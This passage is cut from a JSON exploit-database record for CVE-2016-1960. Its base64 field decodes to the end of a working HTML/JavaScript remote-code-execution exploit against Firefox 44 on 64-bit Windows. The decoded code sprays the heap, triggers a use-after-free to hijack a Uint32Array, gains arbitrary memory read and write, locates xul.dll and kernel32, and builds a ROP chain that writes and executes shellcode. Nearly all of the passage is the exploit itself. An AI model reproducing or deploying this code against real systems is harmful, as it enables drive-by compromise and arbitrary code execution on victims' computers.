SBgbmFtZScgZnJvbSB0aGUgbGFzdCBub2RlIHdpdGggYSBkZWNyZW1lbnRlZA0KICAgICAqIHJlZmNvdW50LCBpZiBhbnkgYXJlIGZvdW5kDQogICAgICovDQogICAgdGhpcy5maW5kU3R5bGVBZGRyID0gZnVuY3Rpb24obm9kZXMpIHsNCiAgICAgICAgY29uc3Qgc2l6ZSA9IHRoaXMubnNIdG1sNVN0YWNrTm9kZVNpemUgLyA0Ow0KDQogICAgICAgIGZvciAobGV0IGkgPSA2NCAqIHNpemUgLSAxOyBpID49IDA7IGkgLT0gc2l6ZSkgew0KICAgICAgICAgICAgaWYgKG5vZGVzW2ldID09PSB0aGlzLnJlZmNvdW50IC0gMSkgew0KICAgICAgICAgICAgICAgIHJldHVybiBub2Rlc1tpLTVdOw0KICAgICAgICAgICAgfQ0KICAgICAgICB9DQogICAgfTsNCg0KICAgIC8qDQogICAgICogTG9jYXRlcyBhIHN1YmFycmF5IGluIGBhcnJheScgdGhhdCBvdmVybGFwcyB3aXRoIGBub2RlcycNCiAgICAgKi8NCiAgICB0aGlzLmZpbmRBcnJheSA9IGZ1bmN0aW9uKG5vZGVzLCBhcnJheSkgew0KICAgICAgICAvKiBpbmRleCAwLi4zIGlzIG1ldGFkYXRhIGZvciBgYXJyYXknICovDQogICAgICAgIG5vZGVzWzRdID0gMHg0MTQxNDE0MTsNCiAgICAgICAgbm9kZXNbNV0gPSAweDQyNDI0MjQyOw0KDQogICAgICAgIGZvciAobGV0IGkgPSAwOyBpIDwgYXJyYXkubGVuZ3RoOyBpKyspIHsNCiAgICAgICAgICAgIGlmIChhcnJheVtpXVswXSA9PT0gMTU2ODQyMDk5MzMwLjUwOTgpIHsNCiAgICAgICAgICAgICAgICByZXR1cm4gYXJyYXlbaV07DQogICAgICAgICAgICB9DQogICAgICAgIH0NCiAgICAgICAgdGhyb3cgbmV3IEVycm9yKCJVaW50MzJBcnJheSBoaWphY2sgZmFpbGVkIik7DQogICAgfTsNCn0NCg0KZnVuY3Rpb24gbG9nKG1zZykgew0KICAgIGR1bXAoIj0+ICIgKyBtc2cgKyAiXG4iKTsNCiAgICBjb25zb2xlLmxvZygiPT4gIiArIG1zZyk7DQp9DQoNCmxldCBub2RlczsNCmxldCBoaWphY2tlZDsNCndpbmRvdy5vbmxvYWQgPSBmdW5jdGlvbigpIHsNCiAgICBpZiAoIW5hdmlnYXRvci51c2VyQWdlbnQubWF0Y2goL1dpbmRvd3MgTlQgWzAtOS5dKzsgV09XNjQ7IHJ2OjQ0XC4wLykpIHsNCiAgICAgICAgdGhyb3cgbmV3IEVycm9yKCJ1bnN1cHBvcnRlZCB1c2VyLWFnZW50Iik7DQogICAgfQ0KDQogICAgY29uc3Qgc3ByYXkgPSBuZXcgU3ByYXkoKTsNCg0KICAgIC8qDQogICAgICogc3ByYXkgbm9kZXMNCiAgICAgKi8NCiAgICBsZXQgYnJ1dGVmb3JjZSA9IHRydWU7DQogICAgbGV0IGFkZHIgPSBzcHJheS5nZXROZXh0QWRkcigwKTsNCiAgICBjb25zdCBocmVmID0gd2luZG93LmxvY2F0aW9uLmhyZWYuc3BsaXQoIj8iKTsNCiAgICBpZiAoaHJlZi5sZW5ndGggPT09IDIpIHsNCiAgICAgICAgY29uc3QgcXVlcnkgPSBocmVmWzFdLnNwbGl0KCI9Iik7DQogICAgICAgIGlmIChxdWVyeVswXSA9PT0gInN0eWxlIikgew0KICAgICAgICAgICAgYnJ1dGVmb3JjZSA9IGZhbHNlOw0KICAgICAgICB9DQogICAgICAgIGFkZHIgPSBwYXJzZUludChxdWVyeVsxXSk7DQogICAgfQ0KICAgIG5vZGVzID0gc3ByYXkubm9kZXMoYWRkciwgYnJ1dGVmb3JjZSk7DQoNCiAgICAvKg0KICAgICAqIHNwcmF5IG5vZGUgcG9pbnRlcnMgYW5kIHRyaWdnZXIgdGhlIGJ1Zw0KICAgICAqLw0KICAgIGRvY3VtZW50LmJvZHkuaW5uZXJIVE1MID0gIjxzdmc+PGltZyBpZD0nQUFBQSc+IjsNCiAgICBjb25zdCBwb2ludGVycyA9IHNwcmF5LnBvaW50ZXJzKCk7DQogICAgZG9jdW1lbnQuZ2V0RWxlbWVudEJ5SWQoIkFBQUEiKS5pbm5lckhUTUwgPSAiPHRpdGxlPjx0ZW1wbGF0ZT48dGQ+PHRyPjx0aXRsZT48aT48L3RyPjxzdHlsZT50ZDwvc3R5bGU+IjsNCg0KICAgIC8qDQogICAgICogb24gdG8gdGhlIG5leHQgcnVuLi4uDQogICAgICovDQogICAgaWYgKGJydXRlZm9yY2UgPT09IHRydWUpIHsNCiAgICAgICAgY29uc3Qgc3R5bGUgPSBzcHJheS5maW5kU3R5bGVBZGRyKG5vZGVzKTsNCiAgICAgICAgbm9kZXMgPSBudWxsOw0KICAgICAgICBpZiAoc3R5bGUpIHsNCiAgICAgICAgICAgIHdpbmRvdy5sb2NhdGlvbiA9IGhyZWZbMF0gKyAiP3N0eWxlPSIgKyBzdHlsZTsNCiAgICAgICAgfSBlbHNlIHsNCiAgICAgICAgICAgIHdpbmRvdy5sb2NhdGlvbiA9IGhyZWZbMF0gKyAiP2NvbnRpbnVlPSIgKyBzcHJheS5nZXROZXh0QWRkcihhZGRyKTsNCiAgICAgICAgfQ0KICAgICAgICByZXR1cm47DQogICAgfQ0KDQogICAgLyoNCiAgICAgKiByZWFsbG9jYXRlIHRoZSBmcmVlZCBVaW50MzJBcnJheQ0KICAgICAqLw0KICAgIGhpamFja2VkID0gc3ByYXkuZmluZEFycmF5KG5vZGVzLCBzcHJheS5hcnJheXMoKSk7DQoNCiAgICAvKg0KICAgICAqIHNldHVwIGhlbHBlcnMNCiAgICAgKi8NCiAgICBjb25zdCByd3ggPSBuZXcgUmVhZFdyaXRlRXhlY3V0ZShzcHJheS5ub2RlQmFzZSwgbm9kZXMsIGhpamFja2VkKTsNCg0KICAgIC8qIFRoZSBmaXJzdCA0IGJ5dGVzIG9mIHRoZSBwcmV2aW91c2x5IGxlYWtlZCBbeHVsIW5zSHRtbDVBdG9tczo6c3R5bGVdDQogICAgICogY29udGFpbiB0aGUgYWRkcmVzcyBvZiB4dWwhUGVybWFuZW50QXRvbUltcGw6OmB2ZnRhYmxlJy4NCiAgICAgKg0KICAgICAqIE5vdGUgdGhhdCB0aGUgc3VidHJhY3RlZCBvZmZzZXQgaXMgc3BlY2lmaWMgdG8gZmlyZWZveCA0NC4wLjIuDQogICAgICogSG93ZXZlciwgc2luY2Ugd2UgY2FuIHJlYWQgYXJiaXRyYXJ5IG1lbW9yeSBieSB0aGlzIHBvaW50LCB0aGUNCiAgICAgKiBiYXNlIG9mIHh1bCBjb3VsZCBlYXNpbHkgKGFsYmVpdCBwZXJoYXBzIHNvbWV3aGF0IHNsb3dseSkgYmUNCiAgICAgKiBsb2NhdGVkIGJ5IHNlYXJjaGluZyBmb3IgYSBQRSBzaWduYXR1cmUgKi8NCiAgICBjb25zdCB4dWxCYXNlID0gcnd4LnJlYWREV29yZChhZGRyKSAtIDB4MWMxZjgzNDsNCg0KICAgIGxvZygic3R5bGUgZm91bmQgYXQgMHgiICsgYWRkci50b1N0cmluZygxNikpOw0KICAgIGxvZygieHVsLmRsbCBmb3VuZCBhdCAweCIgKyB4dWxCYXNlLnRvU3RyaW5nKDE2KSk7DQoNCiAgICBjb25zdCB4dWxQRSA9IG5ldyBQb3J0YWJsZUV4ZWN1dGFibGUoeHVsQmFzZSwgcnd4KTsNCiAgICB4dWxQRS5yZWFkKCk7DQogICAgY29uc3Qgcm9wID0gbmV3IFJPUEhlbHBlcih4dWxQRSwgcnd4KTsNCiAgICBjb25zdCBrZXJuZWwzMiA9IG5ldyBLRVJORUwzMihyb3AsIHh1bFBFLCByd3gpOw0KICAgIGNvbnN0IGtlcm5lbDMyaGFuZGxlID0ga2VybmVsMzIuR2V0TW9kdWxlSGFuZGxlQSgia2VybmVsMzIuZGxsIik7DQogICAgY29uc3Qga2VybmVsMzJQRSA9IG5ldyBQb3J0YWJsZUV4ZWN1dGFibGUoa2VybmVsMzJoYW5kbGUsIHJ3eCk7DQogICAga2VybmVsMzJQRS5yZWFkKCk7DQogICAgY29uc3QgbnRkbGwgPSBuZXcgTlRETEwocm9wLCBrZXJuZWwzMlBFLCByd3gpOw0KICAgIGNvbnN0IGljdXVjNTUgPSBuZXcgSUNVVUM1NShyb3AsIHh1bFBFLCByd3gpOw0KDQogICAgLyoNCiAgICAgKiBleGVjdXRlIHNoZWxsY29kZQ0KICAgICAqLw0KICAgIGNvbnN0IHN0YWNrID0gbnRkbGwuZ2V0U3RhY2tMaW1pdChrZXJuZWwzMi5HZXRDdXJyZW50VGhyZWFkKCkpOw0KICAgIGNvbnN0IGV4ZWMgPSBpY3V1YzU1LmFsbG9jKHN0YWNrLCBzaGVsbGNvZGUubGVuZ3RoKTsNCiAgICBjb25zdCBwcm9jID0geHVsUEUuc2VhcmNoKCJrZXJuZWwzMi5kbGwiLCAiR2V0UHJvY0FkZHJlc3MiKTsNCiAgICByd3gud3JpdGVTdHJpbmcoZXhlYywgc2hlbGxjb2RlLmpvaW4oIiIpKTsNCiAgICByb3AuZXhlY3V0ZShleGVjLCBba2VybmVsMzJoYW5kbGUsIHByb2NdLCB0cnVlKTsNCn07DQo8L3NjcmlwdD4NCjwvaGVhZD4NCjwvaHRtbD4=", 
    "filename": "platforms/windows/remote/42484.html", 
    "id": "42484", 
    "cves": [
        "CVE-2016-1960"
    ]
}